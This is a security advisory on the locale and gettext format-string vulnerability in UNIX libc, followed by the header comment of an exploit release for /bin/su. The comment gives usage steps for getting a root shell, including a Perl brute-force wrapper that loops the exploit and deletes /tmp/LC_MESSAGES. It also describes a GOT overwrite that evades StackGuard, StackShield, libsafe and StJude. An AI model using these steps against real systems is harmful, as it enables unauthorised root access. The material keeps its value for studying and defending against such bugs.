Many UNIX operating systems provide internationalization support according to the X/Open XPG3, XPG4 and Sun/Uniforum specifications using the of the locale subsystem. The locale subsystem comprises a set of databases that store language and country specific information and a set of library functions used to store, retrieve and generally manage that information.

In particular a database with messages used by almost all the operating system programs is keep for each supported language.

The programs access this database using the gettext(3), dgettext(3), dcgettext(3) C functions (Sun/Uniforum specifications) or catopen(3), catgets(3) and catclose(3) ( X/Open XPG3 and XPG4 specification).

Generally a program that needs to display a message to the user will obtain the proper language specific string from the database using the original message as the search key and printing the results using the printf(3) family of functions. By building and installing a custom messages database an attacker can control the output of the message retrieval functions that get feed to the printf(3) functions.

Bad coding practices and the ability to feed format strings to the later functions makes it possible for an attacker to execute arbitrary code as a privileged user (root) using almost any SUID program on the vulnerable systems.

Alternatively, on some operating systems, the problem can be exploited remotely using the environment variable passing options in telnetd. However, a remote attacker must be able to place the suitable messages database on the target host (i.e. anonymous ftp, NFS, email, etc.)

It should be noted under Linux this problem must be exploited in conjunction with a another flaw in glibc. On RedHat systems, it is possible to evade the protection built-into libc that patches this vulnerability and exploit userhelper to gain root access. RedHat has released packages to fix this vulnerability.

/*
   Hail to thee dear readers,

   This is yet another /bin/su + buggy locale functions in libc exploit.
   The reason for writing it is rather easy to explain, all existing versions
   of "su" format bug exploits were very unreliable and tedious to use - the
   number of addresses on the stack, and thus the number of %.8x signs to use
   varied heavily, as well as the alignment. Return adresses were expected to
   be specified on the command line, which is imho an idiotic thing to combine
   with all the other options that also are to be 'brute forced'.
   Finding these values by hand is a too tedious thing to do and costs the
   average script-kid way too much time. I hoped to solve this in this exploit
   and have found it to work on many different machines so far by using a
   small brute forcing perl wrapper.

   Also this little exploit demonstrates a part of things I have been working
   on regarding generalization of overflow/format bug writing and exploit
   dynamics. I will shortly discuss those here:

   - overflow string creation
     This is always the most bulky part of writing overflows, exploits get
     confusing by adding 10 for loops which form the string that's used to
     attack with. The strcreat() function solves this problem a bit.
   - Return address guesses
     The EGG shell has been known for long, but it can still vary a bit
     because of the number of environment entries - cleaning the entire
     environment before proceeding gets rid of this problem
   - GOT overwrites
     An ugly function is used to determine the GOT entry of a given function
     exit() in this exploit.
     It can be rewritten to include elf.h and read the got without
intervention
     of binutils tools.
   - Address to %[0-9]{1,5}d%hn[0-9]{1,5}%d%hn translation
     The function createDString() manages this and saves some more trouble

   I have been doing more work regarding exploit function modelling and
   generalization, and anyone interested is free to mail me (obviously,
   virtually everyone is free to mail me, if not to state that this source
   code contains MANY memory leaks. I don't care, it's not a daemon).

   For the lil kids out there:
      1) This code is Double-ROT-13 encoded - decode it before proceeding
      2) Take five black candles, place them in a pentagram around your
         computer. Take a piece of charcoal and draw vertices between the
         candles.
3) Run around the circle counter-clockwise completely naked for seven
         times while performing a ritual goat-sacrifice and humming strange
         incantations.
      4) Rip out the #define TESTMODE 1 - this forces kids to read my stuff :)
      5) If strange phenomenae occur during step 2 & 3, do not worry, this is
         a common problem of this program, but not considered a bug.
      6) Compile this program
      7) Make the following perl file:

   #!/usr/bin/perl

   for($i=100;$i<400;$i++) {
      for($a=0;$a<4;$a++) {
         system("./a.out", $i, $a);
         system("rm -rf /tmp/LC_MESSAGES");
      }
   }

   The values of "i" can be changed as you like, most of the time 100 - 200
   will do.

      8) Run the perl file and have some patience to get a shell
      9) If this doesn't work, repeat steps 2, 3, 8 and 9

   Dangers:
     This exploit uses a GOT overwrite and evades StackGuard, StackShield
     and libsafe by doing so.
     Kernel modules such as StJude still allow /bin/su to execute processes
     as root, and therefore this exploit evades them.
     We have had some unconfirmed rumours of strange phenomenae not waning
     again after presenting themselves. There is no solution for this yet.
     This program may incur a heavy weight on social relations whenever
friends
     or family barge in during step 2 or 3.

   Because of this I made sure not to make this easy-to-use su exploit
   openwall evading as well; this has been done already in a hard to use
   exploit, and it should be trivial to include that in here.
   Also, since "su" executes a shell itself, it should be possible to
   return explicitly into "su" memory space and evade non executable stacks
   like this.

   If this doesn't work:
      - Make sure /usr/bin/msgfmt is present and executable
      - Make sure awk, grep and objdump are where they are expected to be
        (look at the #defines in front of the getGOT() function)
      - Make sure /bin/su calls gettext() by doing strings /bin/su | grep \
        gettext (Slack 4 & 7 su doesn't do this for instance)
      - Make sure you didn't skip step 2 or 3

   Enough ranting, I grow tired, and probably, so do all of you reading up
   this far! I'll include shouts and be on my way again :)
